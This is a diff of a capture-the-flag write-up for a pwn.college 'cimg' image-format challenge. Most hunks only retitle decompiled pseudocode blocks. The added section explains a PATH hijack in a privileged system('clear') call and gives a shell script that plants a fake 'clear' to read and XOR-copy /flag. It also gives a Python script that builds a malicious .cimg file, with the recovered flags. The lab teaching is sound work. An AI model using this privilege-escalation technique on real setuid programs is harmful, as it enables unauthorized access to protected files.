@@ -9461,7 +9461,7 @@ struct cimg {
 ```
 
 
-```c title="/challenge/cimg :: main()" showLineNumbers
+```c title="/challenge/cimg :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   __int64 v3; // rcx
@@ -10147,7 +10147,7 @@ EXIT:
 
 Finally, we can figure out what `handle_4()` is doing.
 
-```c title="/challenge/cimg :: handle_4()" showLineNumbers
+```c title="/challenge/cimg :: handle_4() :: Pseudocode" showLineNumbers
 // positive sp value has been detected, the output may be wrong!
 unsigned __int64 __fastcall handle_4(struct cimg *cimg)
 {
@@ -10337,7 +10337,7 @@ struct cimg {
 };
 ```
 
-```c title="/challenge/cimg :: handle_4()" showLineNumbers
+```c title="/challenge/cimg :: handle_4() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_4(struct cimg *cimg)
 {
   _DWORD *p_pixels;
@@ -10855,7 +10855,7 @@ LABEL_11:
 }
 ```
 
-```c title="/challenge/cimg :: handle_1()" showLineNumbers
+```c title="/challenge/cimg :: handle_1() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_1(__int64 a1)
 {
   int v1; // ebp
@@ -10918,7 +10918,7 @@ LABEL_7:
 }
 ```
 
-```c title="/challenge/cimg :: handle_2()" showLineNumbers
+```c title="/challenge/cimg :: handle_2() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_2(__int64 a1)
 {
   unsigned int v1; // ebx
@@ -10993,7 +10993,7 @@ LABEL_7:
 }
 ```
 
-```c title="/challenge/cimg :: handle_3()" showLineNumbers
+```c title="/challenge/cimg :: handle_3() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_3(__int64 a1)
 {
   __int64 v2; // rax
@@ -11043,7 +11043,7 @@ LABEL_9:
 }
 ```
 
-```c title="/challenge/cimg :: handle_4()" showLineNumbers
+```c title="/challenge/cimg :: handle_4() :: Pseudocode" showLineNumbers
 // positive sp value has been detected, the output may be wrong!
 unsigned __int64 __fastcall handle_4(__int64 a1)
 {
@@ -11171,7 +11171,7 @@ unsigned __int64 __fastcall handle_4(__int64 a1)
 }
 ```
 
-```c title="/challenge/cimg :: handle_5()" showLineNumbers
+```c title="/challenge/cimg :: handle_5() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_5(__int64 a1)
 {
   __int16 v2; // dx
@@ -11297,7 +11297,7 @@ pwn.college{cl4-LleAt4eMVhiMpLcaDyn4RBc.QX0EzMwEDL4ITM0EzW}
 
 ### Binary Analysis
 
-```c title="/challenge/cimg :: main()" showLineNumbers
+```c title="/challenge/cimg :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   __int64 v3; // rcx
@@ -11387,7 +11387,7 @@ LABEL_11:
 }
 ```
 
-```c title="/challenge/cimg :: handle_1()" showLineNumbers
+```c title="/challenge/cimg :: handle_1() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_1(__int64 a1)
 {
   int v1; // ebp
@@ -11450,7 +11450,7 @@ LABEL_7:
 }
 ```
 
-```c title="/challenge/cimg :: handle_2()" showLineNumbers
+```c title="/challenge/cimg :: handle_2() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_2(__int64 a1)
 {
   unsigned int v1; // ebx
@@ -11525,7 +11525,7 @@ LABEL_7:
 }
 ```
 
-```c title="/challenge/cimg :: handle_3()" showLineNumbers
+```c title="/challenge/cimg :: handle_3() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_3(__int64 a1)
 {
   __int64 v2; // rax
@@ -11575,7 +11575,7 @@ LABEL_9:
 }
 ```
 
-```c title="/challenge/cimg :: handle_4()" showLineNumbers
+```c title="/challenge/cimg :: handle_4() :: Pseudocode" showLineNumbers
 // positive sp value has been detected, the output may be wrong!
 unsigned __int64 __fastcall handle_4(__int64 a1)
 {
@@ -11703,7 +11703,7 @@ unsigned __int64 __fastcall handle_4(__int64 a1)
 }
 ```
 
-```c title="/challenge/cimg :: handle_5()" showLineNumbers
+```c title="/challenge/cimg :: handle_5() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_5(__int64 a1)
 {
   __int16 v2; // dx
@@ -11769,7 +11769,7 @@ LABEL_6:
 }
 ```
 
-```c title="/challenge/cimg :: handle_6()" showLineNumbers
+```c title="/challenge/cimg :: handle_6() :: Pseudocode" showLineNumbers
 unsigned __int64 __fastcall handle_6(__int64 a1)
 {
   __uid_t v1; // eax
@@ -11786,7 +11786,7 @@ unsigned __int64 __fastcall handle_6(__int64 a1)
 }
 ```
 
-```c title="/challenge/cimg :: handle_7()" showLineNumbers
+```c title="/challenge/cimg :: handle_7() :: Pseudocode" showLineNumbers
 unsigned __int64 handle_7()
 {
   unsigned int v1; // [rsp+4h] [rbp-24h] BYREF
@@ -11802,52 +11802,110 @@ unsigned __int64 handle_7()
 }
 ```
 
+`handle_7()` is straightforward, it reads 4 bytes as milliseconds and calls `nanosleep()`, implementing a simple delay.
+`handle_6()` is more interesting, it calls `system("clear")` after setting the UID to the effective UID of the binary. Since `system()` resolves `clear` via `PATH`, this is a classic PATH hijacking vulnerability.
+
+`handle_5()` also gained a new check compared to the previous challenge:
+
+```c title="/challenge/cimg :: habdle_5() :: Pseudocode"
+# ---- snip ----
+
+  if ( !strncmp(v10, "pwn.college{", 0xCuLL) )
+  {
+    v4 = stderr;
+    v5 = "ERROR: shenanigans detected!!!!!";
+LABEL_13:
+    fputs(v5, v4);
+LABEL_6:
+    exit(-1);
+  }
+
+# ---- snip ----
+```
+
+This prevents directly loading `/flag` as a sprite.
+
 ### Exploit
 
-```py
-from pwn import *
+The two main obstacles are:
+1. `handle_5()` blocks loading `/flag` directly by checking if the sprite data starts with `pwn.college{`
+2. `handle_6()` gives us a PATH hijacking primitive via `system("clear")`
+
+
+We can chain these together. 
+First, we create a fake `clear` script that runs with the binary's elevated privileges and copies the flag, but XORs every byte with 1 before saving it, so it no longer starts with `pwn.college{` and passes the shenanigans check. We then prepend our fake `clear` directory to `PATH` so `handle_6()` picks it up.
+
+
+```
+hacker@reverse-engineering~unsafe-animations:~$ mkdir -p /tmp/pwn
+cat > /tmp/pwn/clear << 'EOF'
+#!/bin/sh
+python3 -c "
+data = open('/flag','rb').read()
+out = bytes(b ^ 1 for b in data)
+open('/tmp/flag_copy','wb').write(out)
+"
+chmod 777 /tmp/flag_copy
+EOF
+chmod 777 /tmp/pwn/clear
+export PATH=/tmp/pwn:$PATH
+```
+
+With the fake `clear` in place, we build a `.cimg` that fires directive 6 first (triggering the PATH hijack and creating `/tmp/flag_copy`), then directive 5 (loading the XORed flag as a sprite), and finally directive 4 (rendering it to the screen).
+
+```py title="~/script.py" showLineNumbers
 import struct
 
-# MAGIC = 0x47494D43 (1196247395)
-# VERSION = 4
-# WIDTH = 100 (Offset 6)
-# HEIGHT = 100 (Offset 7)
-# NUM_INST = 2 (Offset 8)
+MAGIC   = 0x474D4963
+VERSION = 4
+FB_W, FB_H = 80, 80
 
-# We construct the 12-byte header exactly as main() reads it.
-# Offset: 0 1 2 3 | 4 5 | 6 | 7 | 8 9 10 11
-# Data  : MAGIC   | VER | W | H | NUM_INST
-header = struct.pack("<I H B B I", 
-    1196247395, # Magic (4 bytes)
-    4,          # Version (2 bytes)
-    100,        # Width (1 byte)
-    100,        # Height (1 byte)
-    2           # Num Instructions (4 bytes)
-)
+SPRITE_ID = 0
+FLAG_COPY = b"/tmp/flag_copy\x00"
+
+def directive_6():
+    return struct.pack("<H", 6) + b"\x00"
 
 def directive_5(sprite_id, w, h, path):
-    # struct v12 layout in handle_5:
-    # [0]=id, [1]=h, [2]=w, [3...]=path
-    # To bypass strncmp(..., 12), total read (w*h) must be < 12.
-    rec = struct.pack("<BBB", sprite_id, h, w)
+    rec  = bytes([sprite_id, h, w])
     rec += path.ljust(255, b"\x00")
     return struct.pack("<H", 5) + rec
 
 def directive_4(sprite_id, x, y):
-    # [id, R, G, B, x, y, rep_x, rep_y, transp]
-    rec = struct.pack("<BBBBBBBBB", sprite_id, 255, 255, 255, x, y, 1, 1, 0)
-    return struct.pack("<H", 4) + rec
+    return struct.pack("<HBBBBBBBBB", 4, sprite_id, 255, 255, 255, x, y, 1, 1, 0)
 
-# Build payload
-# After the 12-byte header, the next read is the 2-byte directive code.
-payload = (
-    header + 
-    directive_5(0, 11, 1, b"/flag") + # Load 11 bytes to bypass check
-    directive_4(0, 0, 0)              # Render the bypassed data
-)
+directives = [
+    directive_6(),
+    directive_5(SPRITE_ID, 1, 59, FLAG_COPY),
+    directive_4(SPRITE_ID, 0, 0),
+]
+
+header = struct.pack("<I H B B I", MAGIC, VERSION, FB_W, FB_H, len(directives))
+payload = header + b"".join(directives)
 
 with open("solution.cimg", "wb") as f:
     f.write(payload)
 
-print("[+] Final Payload generated. No extra padding, correct offsets.")
+print("[+] Run: /challenge/cimg solution.cimg")
+```
+
+```
+hacker@reverse-engineering~unsafe-animations:~$ python ~/script.py
+[+] Run: /challenge/cimg solution.cimg
+```
+
+```
+hacker@reverse-engineering~unsafe-animations:~$ /challenge/cimg ~/solution.cimg 
+
+# ---- snip ----
+
+qvo/bnmmdfdzXrl2jT{y36pLNqjv[c1Ysv@kKCS/PY2D{LvDEM5HUL1D{V|   
+```
+
+```
+hacker@reverse-engineering~unsafe-animations:~$ python3 -c "
+data = 'qvo/bnmmdfdzXrl2jT{y36pLNqjv[c1Ysv@kKCS/PY2D{LvDEM5HUL1D{V|'
+print(bytes(ord(b) ^ 1 for b in data).decode())
+"
+pwn.college{Ysm3kUzx27qMOpkwZb0XrwAjJBR.QX3EzMwEDL4ITM0EzW}
 ```
